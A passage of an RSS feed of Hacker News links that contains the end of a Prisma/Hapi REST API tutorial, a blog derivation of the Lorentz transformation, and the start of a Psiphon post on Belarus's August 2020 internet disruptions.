(current)</td></tr><tr><td>Testing</td><td>Part 2 (current)</td></tr><tr><td>Authentication</td><td>Coming up</td></tr><tr><td>Authorization</td><td>Coming up</td></tr><tr><td>Integration with external APIs</td><td>Coming up</td></tr><tr><td>Deployment</td><td>Coming up</td></tr></tbody></table><h4 id="what-you-will-learn-today"><a href="#what-you-will-learn-today" aria-label="what you will learn today permalink"></a>What you will learn today</h4><p>In the first article, you designed a data model for the problem domain and wrote a seed script which uses Prisma Client to save data to the database.</p><p>In this second article of the series, you will build a REST API on top of the data model and Prisma schema from the <a target="_blank" rel="noopener noreferrer" href="https://www.prisma.io/5f3eaf89d58709000706efb2--prisma-blog.netlify.app/blog-assets/blog/modern-backend-1-tsjs1ps7kip1">first article</a>. You will use <a target="_blank" rel="noopener noreferrer" href="https://hapi.dev/">Hapi</a> to build the REST API. With the REST API, you'll be able to perform database operations via HTTP requests.</p><p>As part of the REST API, you will develop the following aspects:</p><ol><li><strong>REST API:</strong> Implement an HTTP server with resource endpoints to handle CRUD for the different models. You will integrate Prisma with Hapi so as to allow accessing Prisma Client for the API endpoint handlers.</li><li><strong>Validation:</strong> Add payload validation rules to ensure that user input matches the expected types of the Prisma schema.</li><li><strong>Testing:</strong> Write tests for the REST endpoints with <a target="_blank" rel="noopener noreferrer" href="https://jestjs.io/">Jest</a> and Hapi's <a target="_blank" rel="noopener noreferrer" href="https://hapi.dev/api?v=19.2.0#-await-serverinjectoptions"><code>server.inject</code></a> that simulate HTTP requests verifying the validation and persistence logic of the REST endpoints.</li></ol><p>By the end of this article you will have a REST API with endpoints for CRUD (Create, Read, Update, and Delete) operations and tests. The REST resources will map HTTP requests to the models in the Prisma schema, e.g. a <code>GET /users</code> endpoint will handle operations associated with the <code>User</code> model.</p><p>The next parts of this series will cover the other aspects from the list in detail.</p><blockquote><p><strong>Note:</strong> Throughout the guide you'll find various <strong>checkpoints</strong> that enable you to validate whether you performed the steps correctly.</p></blockquote><h3 id="prerequisites"><a href="#prerequisites" aria-label="prerequisites permalink"></a>Prerequisites</h3><h4 id="assumed-knowledge"><a href="#assumed-knowledge" aria-label="assumed knowledge permalink"></a>Assumed knowledge</h4><p>This series assumes basic knowledge of TypeScript, Node.js, and relational databases. If you're experienced with JavaScript but haven't had the chance to try TypeScript, you should still be able to follow along. The series will use PostgreSQL, however, most of the concepts apply to other relational databases such as MySQL. Additionally, familiarity with REST concepts is useful. Beyond that, no prior knowledge of Prisma is required as that will be covered in the series.</p><h4 id="development-environment"><a href="#development-environment" aria-label="development environment permalink"></a>Development environment</h4><p>You should have the following installed:</p><ul><li><a target="_blank" rel="noopener noreferrer" href="https://nodejs.org/en/">Node.js</a></li><li><a target="_blank" rel="noopener noreferrer" href="https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/docker.com">Docker</a> (will be used to run a development PostgreSQL database)</li></ul><p>If you're using Visual Studio Code, the <a target="_blank" rel="noopener noreferrer" href="https://marketplace.visualstudio.com/items?itemName=Prisma.prisma">Prisma extension</a> is recommended for syntax highlighting, formatting, and other helpers.</p><blockquote><p><strong>Note</strong>: If you don't want to use Docker, you can set up a <a target="_blank" rel="noopener noreferrer" href="https://dataguide.prisma.io/postgresql/setting-up-a-local-postgresql-database">local PostgreSQL database</a> or a <a target="_blank" rel="noopener noreferrer" href="https://dev.to/prisma/how-to-setup-a-free-postgresql-database-on-heroku-1dc1">hosted PostgreSQL database on Heroku</a>.</p></blockquote><h3 id="clone-the-repository"><a href="#clone-the-repository" aria-label="clone the repository permalink"></a>Clone the repository</h3><p>The source code for the series can be found on <a target="_blank" rel="noopener noreferrer" href="https://github.com/2color/real-world-grading-app">GitHub</a>.</p><p>To get started, clone the repository and install the dependencies:</p><pre><code>git clone <span>-</span>b part<span>-</span><span>2</span> git@github<span>.</span>com<span>:</span><span>2</span>color<span>/</span>real<span>-</span>world<span>-</span>grading<span>-</span>app<span>.</span>git
cd real<span>-</span>world<span>-</span>grading<span>-</span>app
npm install
</code></pre><blockquote><p><strong>Note:</strong> By checking out the <code>part-2</code> branch you'll be able to follow the article from the same starting point.</p></blockquote><h3 id="start-postgresql"><a href="#start-postgresql" aria-label="start postgresql permalink"></a>Start PostgreSQL</h3><p>To start PostgreSQL, run the following command from the <code>real-world-grading-app</code> folder:</p><pre><code>docker<span>-</span>compose up <span>-</span>d
</code></pre><blockquote><p><strong>Note:</strong> Docker will use the <a target="_blank" rel="noopener noreferrer" href="https://github.com/2color/real-world-grading-app/blob/21de326008776144ced60427a055c9fc54a32840/docker-compose.yml"><code>docker-compose.yml</code></a> file to start the PostgreSQL container.</p></blockquote><h3 id="building-a-rest-api"><a href="#building-a-rest-api" aria-label="building a rest api permalink"></a>Building a REST API</h3><p>Before diving into the implementation, we'll go through some basic concepts relevant in the context of REST APIs:</p><ul><li><strong>API:</strong> Application programming interface. A set of rules that allow programs to talk to each other. Typically the developer creates the API on the server and allows clients to talk to it.</li><li><strong>REST:</strong> A set of conventions that developers follow to expose state-related (in this case state stored in the database) operations over HTTP requests. As an example, check out the <a target="_blank" rel="noopener noreferrer" href="https://docs.github.com/en/rest/overview/resources-in-the-rest-api">GitHub REST API</a>.</li><li><strong>Endpoint:</strong> Entry point to the REST API which has the following properties (non-exhaustive):<ul><li><strong>Path</strong>, e.g. <code>/users/</code>, which is used to access the users endpoint. The path determines the URL used to access the endpoint, e.g. <code>www.myapi.com/users/</code>.</li><li><strong>HTTP method</strong>, e.g. <code>GET</code>, <code>POST</code>, and <code>DELETE</code>. The HTTP method will determine the type of operation an endpoint exposes, for example the <code>GET /users</code> endpoint will allow fetching users and <code>POST /users</code> endpoint will allow creating users.</li><li><strong>Handler</strong>: The code (in this case TypeScript) which will handle requests for an endpoint.</li></ul></li><li><strong>HTTP status codes:</strong> The response HTTP status code will inform the API consumer whether the operation was successful and if any errors occurred. Check out <a target="_blank" rel="noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">this list</a> for the different HTTP status codes, e.g. <code>201</code> when a resource was created successfully, and <code>400</code> when consumer input fails validation.</li></ul><blockquote><p><strong>Note:</strong> One of the key objectives of the REST approach is using HTTP as an application protocol to avoid reinventing the wheel by sticking to conventions.</p></blockquote><h4 id="the-api-endpoints"><a href="#the-api-endpoints" aria-label="the api endpoints permalink"></a>The API endpoints</h4><p>The API will have the following endpoints (HTTP method followed by path):</p><table><thead><tr><th>Resource</th><th>HTTP Method</th><th>Route</th><th>Description</th></tr></thead><tbody><tr><td><code>User</code></td><td><code>POST</code></td><td><code>/users</code></td><td>Create a user (and optionally associate with courses)</td></tr><tr><td><code>User</code></td><td><code>GET</code></td><td><code>/users/{userId}</code></td><td>Get a user</td></tr><tr><td><code>User</code></td><td><code>PUT</code></td><td><code>/users/{userId}</code></td><td>Update a user</td></tr><tr><td><code>User</code></td><td><code>DELETE</code></td><td><code>/users/{userId}</code></td><td>Delete a user</td></tr><tr><td><code>User</code></td><td><code>GET</code></td><td><code>/users</code></td><td>Get users</td></tr><tr><td><code>CourseEnrollment</code></td><td><code>GET</code></td><td><code>/users/{userId}/courses</code></td><td>Get a user's enrollement incourses</td></tr><tr><td><code>CourseEnrollment</code></td><td><code>POST</code></td><td><code>/users/{userId}/courses</code></td><td>Enroll a user to a course (as student or teacher)</td></tr><tr><td><code>CourseEnrollment</code></td><td><code>DELETE</code></td><td><code>/users/{userId}/courses/{courseId}</code></td><td>Delete a user's enrollment to a course</td></tr><tr><td><code>Course</code></td><td><code>POST</code></td><td><code>/courses</code></td><td>Create a course</td></tr><tr><td><code>Course</code></td><td><code>GET</code></td><td><code>/courses</code></td><td>Get courses</td></tr><tr><td><code>Course</code></td><td><code>GET</code></td><td><code>/courses/{courseId}</code></td><td>Get a course</td></tr><tr><td><code>Course</code></td><td><code>PUT</code></td><td><code>/courses/{courseId}</code></td><td>Update a course</td></tr><tr><td><code>Course</code></td><td><code>DELETE</code></td><td><code>/courses/{courseId}</code></td><td>Delete a course</td></tr><tr><td><code>Test</code></td><td><code>POST</code></td><td><code>/courses/{courseId}/tests</code></td><td>Create a test for a course</td></tr><tr><td><code>Test</code></td><td><code>GET</code></td><td><code>/courses/tests/{testId}</code></td><td>Get a test</td></tr><tr><td><code>Test</code></td><td><code>PUT</code></td><td><code>/courses/tests/{testId}</code></td><td>Update a test</td></tr><tr><td><code>Test</code></td><td><code>DELETE</code></td><td><code>/courses/tests/{testId}</code></td><td>Delete a test</td></tr><tr><td><code>Test Result</code></td><td><code>GET</code></td><td><code>/users/{userId}/test-results</code></td><td>Get a user's test results</td></tr><tr><td><code>Test Result</code></td><td><code>POST</code></td><td><code>/courses/tests/{testId}/test-results</code></td><td>Create test result for a test associated with a user</td></tr><tr><td><code>Test Result</code></td><td><code>GET</code></td><td><code>/courses/tests/{testId}/test-results</code></td><td>Get multiple test results for a test</td></tr><tr><td><code>Test Result</code></td><td><code>PUT</code></td><td><code>/courses/tests/test-results/{testResultId}</code></td><td>Update a test result (associated with a user and a test)</td></tr><tr><td><code>Test Result</code></td><td><code>DELETE</code></td><td><code>/courses/tests/test-results/{testResultId}</code></td><td>Delete a test result</td></tr></tbody></table><blockquote><p><strong>Note:</strong> The paths containing a parameter enclosed in <code>{}</code>, e.g. <code>{userId}</code> represent a variable that is interpolated in the URL, e.g. in <code>www.myapi.com/users/13</code> the <code>userId</code> is <code>13</code>.</p></blockquote><p>The endpoints above have been grouped based on the main model/resource they're associated with. The categorization will help with organizing the code into separate modules for maintainability.</p><p>In this article, you will implement a subset of the endpoints above (the first four) to illustrate the different patterns for different CRUD operations. The full API will be available in the <a target="_blank" rel="noopener noreferrer" href="https://github.com/2color/real-world-grading-app">GitHub repository</a>.
These endpoints should provide an interface for most operations. While some resources do not have a <code>DELETE</code> endpoint for deleting resources, they can be added later.</p><blockquote><p><strong>Note:</strong> Throughout the article, the words <em>endpoint</em> and <em>route</em> will be used interchangeably. While they refer to the same thing, <em>endpoint</em> is the term used in the context of REST, while <em>route</em> is the term used in the context of HTTP servers.</p></blockquote><h4 id="hapi"><a href="#hapi" aria-label="hapi permalink"></a>Hapi</h4><p>The API will be built with <a target="_blank" rel="noopener noreferrer" href="https://hapi.dev/">Hapi</a> – a Node.js framework for building HTTP servers that support validation and testing out of the box.</p><p>Hapi consists of a core module named <code>@hapi/hapi</code> which is the HTTP server and modules that extend the core functionality. In this backend you will also use the following:</p><ul><li><code>@hapi/joi</code> for declarative input validation</li><li><code>@hapi/boom</code> for HTTP-friendly error objects</li></ul><p>For Hapi to work with TypeScript, you will need to add the types for Hapi and Joi. This is necessary because Hapi is written in JavaScript. By adding the types, you will have rich auto-completion and allow the TypeScript compiler to ensure the type safety of your code.</p><p>Install the following packages:</p><pre><code>npm install <span>--</span>save @hapi<span>/</span>boom @hapi<span>/</span>hapi @hapi<span>/</span>joi
npm install <span>--</span>save<span>-</span>dev @types<span>/</span>hapi__hapi @types<span>/</span>hapi__joi
</code></pre><h4 id="creating-the-server"><a href="#creating-the-server" aria-label="creating the server permalink"></a>Creating the server</h4><p>The first thing you need to do is create a Hapi server which will bind to an interface and port.</p><p>Add the following Hapi server to <code>src/server.ts</code>:</p><pre><code><span>import</span> Hapi <span>from</span> <span>'@hapi/hapi'</span>

<span>const</span> server<span>:</span> Hapi<span>.</span>Server <span>=</span> Hapi<span>.</span><span>server</span><span>(</span><span>{</span>
  port<span>:</span> process<span>.</span>env<span>.</span><span>PORT</span> <span>||</span> <span>3000</span><span>,</span>
  host<span>:</span> process<span>.</span>env<span>.</span><span>HOST</span> <span>||</span> <span>'localhost'</span><span>,</span>
<span>}</span><span>)</span>

<span>export</span> <span>async</span> <span>function</span> <span>start</span><span>(</span><span>)</span><span>:</span> Promise<span>&lt;</span>Hapi<span>.</span>Server<span>&gt;</span> <span>{</span>
  <span>await</span> server<span>.</span><span>start</span><span>(</span><span>)</span>
  <span>return</span> server
<span>}</span>

process<span>.</span><span>on</span><span>(</span><span>'unhandledRejection'</span><span>,</span> err <span>=&gt;</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span>err<span>)</span>
  process<span>.</span><span>exit</span><span>(</span><span>1</span><span>)</span>
<span>}</span><span>)</span>

<span>start</span><span>(</span><span>)</span>
  <span>.</span><span>then</span><span>(</span>server <span>=&gt;</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span><span>`Server running on </span><span><span>${</span>server<span>.</span>info<span>.</span>uri<span>}</span></span><span>`</span></span><span>)</span>
  <span>}</span><span>)</span>
  <span>.</span><span>catch</span><span>(</span>err <span>=&gt;</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span>err<span>)</span>
  <span>}</span><span>)</span>
</code></pre><p>First, you import Hapi. Then you initialize a new <code>Hapi.server()</code> (of type <code>Hapi.Server</code> defined in <code>@types/hapi__hapi</code> package) with connection details containing a port number to listen on and the host information. After that you start the server and log that it's running.</p><p>To run the server locally during development, run the npm <code>dev</code>script which will use <code>ts-node-dev</code> to automatically transpile the TypeScript code and restart the server when you make changes: <code>npm run dev</code>:</p><pre><code>npm run dev

<span>&gt;</span> ts<span>-</span>node<span>-</span>dev <span>--</span>respawn <span>.</span><span>/</span>src<span>/</span>server<span>.</span>ts

Using ts<span>-</span>node version <span>8.10</span><span>.2</span><span>,</span> typescript version <span>3.9</span><span>.6</span>
Server running on http<span>:</span><span>/</span><span>/</span>localhost<span>:</span><span>3000</span>
</code></pre><p><strong>Checkpoint:</strong> If you open <a target="_blank" rel="noopener noreferrer" href="http://localhost:3000/">http://localhost:3000</a> in your browser, you should see the following: <code>{"statusCode":404,"error":"Not Found","message":"Not Found"}</code></p><p>Congratulations, you have successfully created a server. However, the server has no routes defined. In the next step, you will define the first route.</p><h4 id="defining-a-route"><a href="#defining-a-route" aria-label="defining a route permalink"></a>Defining a route</h4><p>To add a route, you will …</p></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/">https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/</a></em></p>]]>
            </description>
            <link>https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242536</guid>
            <pubDate>Sat, 22 Aug 2020 08:02:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lorentz Transformation Derivation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24242252">thread link</a>) | @keyboardman
<br/>
August 21, 2020 | https://leimao.github.io/blog/Lorentz-Transformation-Derivation/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Lorentz-Transformation-Derivation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>In my previous blog post <a href="https://leimao.github.io/blog/Special-Relativity/">“Special Relativity Explained”</a>, I have explained special relativity and its several key consequences based on the Lorentz transformation.</p>



<p>Since I did not give a derivation for Lorentz transformation last time, in this blog post, I would like to present the derivations in detail.</p>

<h3 id="postulates-of-special-relativity">Postulates of Special Relativity</h3>

<p>Lorentz transformation was derived based on the following two postulates only.</p>

<h4 id="first-postulate-principle-of-relativity">First Postulate (Principle of Relativity)</h4>

<p>The laws of physics take the same form in all inertial frames of reference.</p>

<h4 id="second-postulate-invariance-of-light-speed">Second Postulate (Invariance of Light Speed)</h4>

<p>As measured in any inertial frame of reference, light is always propagated in empty space with a definite velocity $c$ that is independent of the state of motion of the emitting body. It is also equivalent to say, the speed of light in free space has the same value $c$ in all inertial frames of reference.</p>

<h3 id="derivation">Derivation</h3>

<p>In the spacetime, we have two reference frames, a reference frame $S$ and another reference frame $S’$ moving at a velocity $v$ with respect to it. So the two reference frames in this scenario are inertial reference frame. The coordinate axes in each reference frame are parallel, i.e., the $x$ and $x’$ axes are parallel, the $y$ and $y’$ axes are parallel, and the $z$ and $z’$ axes are parallel, and remain mutually perpendicular. We assume the relative motion is along the coincident $xx’$ axes. At $t = t’ = 0$, the origins of both coordinate systems are the same, $(x,y,z) = (x’,y’,z’) = (0, 0, 0)$.</p>



<p>An event in the time space could be observed and recorded by the observers on the two reference frames using spacetime coordinates $(t,x,y,z)$ in the reference frame $S$ and $(t’,x’,y’,z’)$ in the reference frame $S’$, respectively.</p>



<p>We want to set up the mapping between $(t,x,y,z)$ and $(t’,x’,y’,z’)$ for the same event.</p>

<h4 id="lorentz-transformation-is-linear-transformation">Lorentz Transformation is Linear Transformation</h4>

<p>We propose the spacetime transformation from the reference frame $S$ to the reference frame $S’$ to have the following form.</p><p>

\[\begin{align}
t^{\prime} &amp;= f_t(x,t)\\
x^{\prime} &amp;= f_x(x,t)\\
y^{\prime} &amp;= y\\
z^{\prime} &amp;= z\\
\end{align}\]

</p><p>Note that we could eliminate the variables $y$ and $z$ in the functions $f_t$ and $f_x$ because of $y$ and $z$ are constants.</p>



<p>Now that we have proposed the form of transformation, there could be an infinite number of transformations that satisfied the form. What exactly the transformation is?</p>



<p>Suppose we have two events, one event has coordinates $(t_1,x_1,y_1,z_1)$ observed in the reference frame $S$ and coordinates $(t’_1,x’_1,y’_1,z’_1)$ observed in the reference frame $S’$, another one has coordinates $(t_2,x_2,y_2,z_2)$ observed in the reference frame $S$ and coordinates $(t’_2,x’_2,y’_2,z’_2)$ observed in the reference frame $S’$. Note that because reference frame $S’$ is moving along the $xx’$ axes, $y_1 = y’_1$, $z_1 = z’_1$, $y_2 = y’_2$, $z_2 = z’_2$.</p>



<p>Without loss of generality, we set $t_1 = t^{\prime}_1 = 0$, $x_1 = x^{\prime}_1 = 0$.</p><p>

\[\begin{align}
\Delta t &amp;= t_{2} - t_{1} = t_{2}\\
\Delta x &amp;= x_{2} - x_{1} = x_{2}\\
\Delta y &amp;= y_{2} - y_{1} = 0\\
\Delta z &amp;= z_{2} - z_{1} = 0\\
\end{align}\]

\[\begin{align}
\Delta t^{\prime} &amp;= t_{2}^{\prime} - t_{1}^{\prime} = t_{2}^{\prime}\\
\Delta x^{\prime} &amp;= x_{2}^{\prime} - x_{1}^{\prime} = x_{2}^{\prime}\\
\Delta y^{\prime} &amp;= y_{2}^{\prime} - y_{1}^{\prime} = 0\\
\Delta z^{\prime} &amp;= z_{2}^{\prime} - z_{1}^{\prime} = 0\\
\end{align}\]

</p><p>The two events, $(t_1,x_1,y_1,z_1)$ and $(t_2,x_2,y_2,z_2)$ observed in reference frame $S$, $(t’_1,x’_1,y’_1,z’_1)$ and $(t’_2,x’_2,y’_2,z’_2)$ observed in reference $S’$ have become equivalent to $(0,0,y_1,z_1)$ and $(\Delta t,\Delta x,y_2,z_2)$ observed in reference frame $S$, $(0,0,y’_1,z’_1)$ and $(\Delta t^{\prime},\Delta x^{\prime},y’_2,z’_2)$ observed in reference $S’$.</p>



<p>Based on the principle of relativity assumption, the transformation still holds. We have</p><p>

\[\begin{align}
0 &amp;= f_t(0,0)\\
0 &amp;= f_x(0,0)\\
y^{\prime} &amp;= y\\
z^{\prime} &amp;= z\\
\end{align}\]

</p><p>and</p><p>

\[\begin{align}
\Delta t^{\prime} &amp;= f_t(\Delta x, \Delta t)\\
\Delta x^{\prime} &amp;= f_x(\Delta x, \Delta t)\\
y^{\prime} &amp;= y\\
z^{\prime} &amp;= z\\
\end{align}\]

</p><p>This means the distances and time elapsed could also be transformed using the exact transformation for coordinates!</p>



<p>Ignoring uninteresting $y$ and $z$, we could equivalently write</p><p>

\[\begin{align}
\begin{bmatrix} 
    \Delta t^{\prime} \\
    \Delta x^{\prime} \\
\end{bmatrix}

&amp;=

\begin{bmatrix} 
    t_2^{\prime} - t_1^{\prime} \\
    x_2^{\prime} - x_1^{\prime} \\
\end{bmatrix}


=

\begin{bmatrix} 
    f_t(x_2,t_2) -  f_t(x_1,t_1)\\
    f_x(x_2,t_2) -  f_x(x_1,t_1)\\
\end{bmatrix}



=

\begin{bmatrix} 
    f_t(x_2,t_2)\\
    f_x(x_2,t_2)\\
\end{bmatrix}

-

\begin{bmatrix} 
    f_t(x_1,t_1)\\
    f_x(x_1,t_1)\\
\end{bmatrix}

\\

&amp;=

f \bigg(

\begin{bmatrix} 
    t_2 \\
    x_2 \\
\end{bmatrix}

\bigg)

-

f \bigg(

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg)

\end{align}\]

\[\begin{align}
\begin{bmatrix} 
    \Delta t^{\prime} \\
    \Delta x^{\prime} \\
\end{bmatrix}

&amp;=

\begin{bmatrix} 
    f_t(\Delta x, \Delta t) \\
    f_x(\Delta x, \Delta t) \\
\end{bmatrix}


=

f \bigg(

\begin{bmatrix} 
    \Delta t \\
    \Delta x \\
\end{bmatrix}

\bigg)

= 

f \bigg(

\begin{bmatrix} 
    t_2 - t_1 \\
    x_2 - x_1 \\
\end{bmatrix}

\bigg)

= 

f \bigg(

\begin{bmatrix} 
    t_2 \\
    x_2 \\
\end{bmatrix}

-

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg)


\end{align}\]

</p><p>We set a column vector $p = [t, x]^{\top}$ and this $p$ is a tensor in physics. It is also equivalent to write</p><p>

\[f(p_2) - f(p_1) = f(p_2 - p_1)\]

</p><p>This is also further equivalent to</p><p>

\[f(p_1) + f(p_2) = f(p_1 + p_2)\]

</p><p>In the next step, we would like to further show</p><p>

\[f(kp) = k f(p)\]

</p><p>Similarly suppose we have two events, one event has coordinates $(t_1,x_1,y_1,z_1)$ observed in the reference frame $S$ and coordinates $(t’_1,x’_1,y’_1,z’_1)$ observed in the reference frame $S’$, another one has coordinates $(t_2,x_2,y_2,z_2)$ observed in the reference frame $S$ and coordinates $(t’_2,x’_2,y’_2,z’_2)$ observed in the reference frame $S’$. In addition, in the reference frame it is observed that $t_2 = k t_1$ and $x_2 = k x_1$. Based on the principal of relativity assumption, $t’_2 = k t’_1$ and $x’_2 = k x’_1$.</p>



<p>Because</p><p>

\[\begin{align}
\begin{bmatrix} 
    t_1^{\prime} \\
    x_1^{\prime} \\
\end{bmatrix}

&amp;=

f \bigg(

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg) 
\end{align}\]

\[\begin{align}

\begin{bmatrix} 
    t_2^{\prime} \\
    x_2^{\prime} \\
\end{bmatrix}

&amp;=

f \bigg(

\begin{bmatrix} 
    t_2 \\
    x_2 \\
\end{bmatrix}


\bigg) 

= 

\begin{bmatrix} 
    k t_1^{\prime} \\
    k x_1^{\prime} \\
\end{bmatrix}


= 

k 
\begin{bmatrix} 
    t_1^{\prime} \\
    x_1^{\prime} \\
\end{bmatrix}

=
k
f \bigg(

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg)

\\

&amp;=

f \bigg(

\begin{bmatrix} 
    k t_1 \\
    k x_1 \\
\end{bmatrix}


\bigg) 

=

f \bigg(

k
\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}


\bigg) 



\end{align}\]

</p><p>Therefore,</p><p>

\[f(kp) = k f(p)\]

</p><p>Because we have shown that</p><p>

\[\begin{align}
f(p_1) + f(p_2) &amp;= f(p_1 + p_2) \\
f(kp) &amp;= k f(p)
\end{align}\]

</p><p>This is exactly the <a href="https://en.wikipedia.org/wiki/Linear_map#Definition_and_first_consequences">definition of a linear function</a> for function $f$ ($f_t$ and $f_x$), and note that this linear function $f$ has no bias term. Therefore, $f(p) = Mp$ for some matrix $M \in \mathbb{R}^{2 \times 2}$, and Lorentz transformation is a linear transformation.</p>

<h4 id="lorentz-transformation">Lorentz Transformation</h4>

<p>Because Lorentz transformation is a linear transformation, we could assume</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    x^{\prime} \\
\end{bmatrix} 

=

M
\begin{bmatrix} 
    t \\
    x \\
\end{bmatrix} 

=

\begin{bmatrix} 
    A &amp; B \\
    C &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    x \\
\end{bmatrix} 


=

\begin{bmatrix} 
    At + Bx \\
    Ct + Dx \\
\end{bmatrix} 


\end{align}\]

</p><p>Then the problem is very like the machine learning regression problem where we have to find the values for parameter $A$, $B$, $C$, and $D$. To solve this regression problem, we need some concrete data.</p>



<p>Because the reference frame $S’$ is moving at velocity $v$ with respect to the reference frame $S$. At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, we know $x = vt$ in the reference frame $S$ overlaps with the origin $x’ = 0$ in the reference frame $S’$. Note that $x = vt + 1$ in the reference frame $S$ does not necessary overlaps with $x’ = 1$ in the reference frame $S’$, although this is true in <a href="https://en.wikipedia.org/wiki/Galilean_transformation">Galilean transformations</a>.</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    0 \\
\end{bmatrix} 

=

\begin{bmatrix} 
    A &amp; B \\
    C &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    vt \\
\end{bmatrix} 

=


\begin{bmatrix} 
    At + Bvt \\
    Ct + Dvt \\
\end{bmatrix} 

\end{align}\]

</p><p>We found the relationships between $C$ and $D$.</p><p>

\[C = -Dv\]

</p><p>In addition, because the reference frame $S$ is moving at velocity $-v$ with respect to the reference frame $S’$. At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, we know $x = 0$ in the reference frame $S$ overlaps with the origin $x’ = -vt$ in the reference frame $S’$.</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    -v t^{\prime} \\
\end{bmatrix} 

=

\begin{bmatrix} 
    A &amp; B \\
    -Dv &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    0 \\
\end{bmatrix} 

=


\begin{bmatrix} 
    At \\
    -Dvt \\
\end{bmatrix} 

\end{align}\]

</p><p>We cancel the variable $t’$ and get</p><p>

\[-vAt = -Dvt\]

</p><p>So</p><p>

\[A = D\]

</p><p>This reduced the number of free parameters from four to two.</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    x^{\prime} \\
\end{bmatrix} 


=

\begin{bmatrix} 
    D &amp; B \\
    -Dv &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    x \\
\end{bmatrix} 


=

\begin{bmatrix} 
    Dt + Bx \\
    -Dt + Dx \\
\end{bmatrix} 


\end{align}\]

</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/blog/Lorentz-Transformation-Derivation/">https://leimao.github.io/blog/Lorentz-Transformation-Derivation/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/blog/Lorentz-Transformation-Derivation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242252</guid>
            <pubDate>Sat, 22 Aug 2020 06:52:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amid major network disruptions, 1.76m Psiphon users in Belarus]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24242139">thread link</a>) | @andrewshadura
<br/>
August 21, 2020 | https://blog-en.psiphon.ca/2020/08/amid-major-network-disruptions-176m.html | <a href="https://web.archive.org/web/*/https://blog-en.psiphon.ca/2020/08/amid-major-network-disruptions-176m.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-441501999805613977" itemprop="description articleBody">
<h2><i><span><span><span>The Psiphon network supported a peak <b>1.76 million</b> daily active users during significant network interference that started August 9th, a figure that represents nearly 1 in every 3 internet users.</span></span></span></i></h2><div><p><span><a href="https://1.bp.blogspot.com/-3q5T-mlMWo4/Xz6Q0DvPsII/AAAAAAACoUo/bmt6I4zOY_chCeBnTn15_U78-4WlV7RngCLcBGAsYHQ/s888/UU-BY.png"><img data-original-height="509" data-original-width="888" src="https://1.bp.blogspot.com/-3q5T-mlMWo4/Xz6Q0DvPsII/AAAAAAACoUo/bmt6I4zOY_chCeBnTn15_U78-4WlV7RngCLcBGAsYHQ/s640/UU-BY.png" width="640"></a></span></p><p><span><span><span id="docs-internal-guid-3f451e46-7fff-2af4-e598-c9c634d0929a">A <a href="https://meduza.io/feature/2020/08/11/internet-v-belarusi-ne-rabotaet-treti-sutki" target="">large-scale disruption</a> to international internet access was observed in Belarus, beginning during the contested presidential election on August 9th. Widespread filtering was reported across all Belarusian networks, affecting popular messaging apps including Telegram, Viber, and WhatsApp; social media platforms Facebook, Twitter, Instagram, and Youtube; major app markets including Google Play and the App Store; email providers Gmail, Mail.ru, and Yandex; maps, banking, online media, and many other services. Rolling blackouts of the mobile networks also occurred nightly between 6PM and 6AM.</span><span> The majority of VPNs were reportedly blocked as a result of generalized SSL/TLS filtering. Tor <a href="https://metrics.torproject.org/userstats-relay-country.html?start=2020-07-01&amp;end=2020-08-17&amp;country=by&amp;events=on">direct connections</a> were disrupted by the increased network change,</span><span> while Tor <a href="https://metrics.torproject.org/userstats-bridge-combined.html?start=2020-07-01&amp;end=2020-08-18&amp;country=by">bridge users</a> reached a peak 8,000 per day during the shutdown period.</span><span> Network outages were tracked by <a href="https://labs.ripe.net/Members/alun_davies/our-first-glance-at-the-belarus-outages">RIPE</a> Labs,</span><span> <a href="https://map.internetintel.oracle.com/?country=BY">Oracle</a> Internet Intelligence,</span><span> <a href="https://ioda.caida.org/ioda/dashboard#view=inspect&amp;entity=country/BY&amp;lastView=overview&amp;from=1596903075&amp;until=1597767075">IODA</a>,</span><span> and other network monitors.</span></span></span></p></div><div><p><span><span><span><p><a href="https://1.bp.blogspot.com/-_rEQvxxTroI/Xz6WOxlT8zI/AAAAAAACoVE/5p4Nj_CQbiEGODDLunxj2oFYDDx66NymgCLcBGAsYHQ/s1529/25106.PNG"><img data-original-height="421" data-original-width="1529" 